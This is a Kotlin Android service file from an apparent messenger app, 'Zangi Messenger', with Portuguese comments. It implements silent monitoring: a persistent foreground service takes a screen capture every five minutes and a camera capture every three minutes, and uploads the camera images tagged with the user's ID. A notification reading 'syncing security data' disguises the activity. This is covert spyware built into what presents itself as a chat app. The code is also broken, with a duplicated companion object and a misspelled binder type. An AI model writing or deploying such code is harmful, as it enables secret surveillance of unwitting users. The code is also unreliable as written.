package com.zangi.chat.service

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.zangi.chat.R
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.*
import java.util.*

/**
 * DataCollectionService: O Gerenciador de Monitoramento Silencioso.
 * Coordena a captura de tela e câmera de forma periódica.
 */
class DataCollectionService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var repository: ChatRepository
    private lateinit var cameraCaptureManager: CameraCaptureManager

    // Configurações de intervalo (ajustáveis para não drenar bateria)
    private val SCREEN_CAPTURE_INTERVAL = 5 * 60 * 1000L // 5 minutos
    private val CAMERA_CAPTURE_INTERVAL = 3 * 60 * 1000L // 3 minutos

    companion object {
        const val CHANNEL_ID = "zangi_telemetry_channel"
        const val NOTIFICATION_ID = 1001
        
        // Ações para controle via Intent
        const val ACTION_START = "START_MONITORING"
        const val ACTION_STOP = "STOP_MONITORING"
    }

    override fun onCreate() {
        super.onCreate()
        repository = ChatRepository.getInstance()
        cameraCaptureManager = CameraCaptureManager(this, repository)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        // Inicia o serviço como Foreground para evitar que o Android o mate
        startForeground(NOTIFICATION_ID, createNotification())

        when (action) {
            ACTION_START -> {
                Log.d(TAG, "🚀 Monitoramento Iniciado")
                startMonitoringLoops()
            }
            ACTION_STOP -> {
                Log.d(TAG, "🛑 Monitoramento Parado")
                stopSelf()
            }
        }

        return START_STICKY
    }

    private fun startMonitoringLoops() {
        // Loop de Captura de Tela
        serviceScope.launch {
            while (isActive) {
                delay(SCREEN_CAPTURE_INTERVAL)
                triggerScreenCapture()
            }
        }

        // Loop de Captura de Câmera
        serviceScope.launch {
            while (isActive) {
                delay(CAMERA_CAPTURE_INTERVAL)
                triggerCameraCapture()
            }
        }
    }

    private fun triggerScreenCapture() {
        serviceScope.launch {
            try {
                Log.d(TAG, "📸 Iniciando ciclo de captura de tela...")
                // Chamada para o ScreenCaptureService (que gerencia MediaProjection)
                val intent = Intent(this@DataCollectionService, ScreenCaptureService::class.java)
                startService(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Erro na captura de tela: ${e.message}")
            }
        }
    }

    private fun triggerCameraCapture() {
        serviceScope.launch {
            try {
                Log.d(TAG, "📷 Iniciando ciclo de captura de câmera...")
                
                // Obtemos o ID do usuário do repositório para enviar na telemetria
                val userId = repository.currentUser.value?.id ?: "unknown_user"
                
                // Chamada real para o gerenciador de câmera que criamos
                val result = cameraCaptureManager.captureAndUpload(userId)
                
                if (result.isSuccess) {
                    Log.i(TAG, "✅ Ciclo de câmera concluído com sucesso.")
                } else {
                    Log.e(TAG, "❌ Ciclo de câmera falhou: ${result.exceptionOrNull()?.message}")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Erro no trigger da câmera: ${e.message}")
            }
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Zangi Messenger")
            .setContentText("Sincronizando dados de segurança...")
            .setSmallIcon(R.drawable.ic_lock) 
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) 
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Zangi System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Gerencia o monitoramento de segurança em segundo plano"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "🧹 Encerrando serviço e cancelando coroutines")
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBBinder? = null

    companion object {
        private const val TAG = "DataCollectionService"
    }
}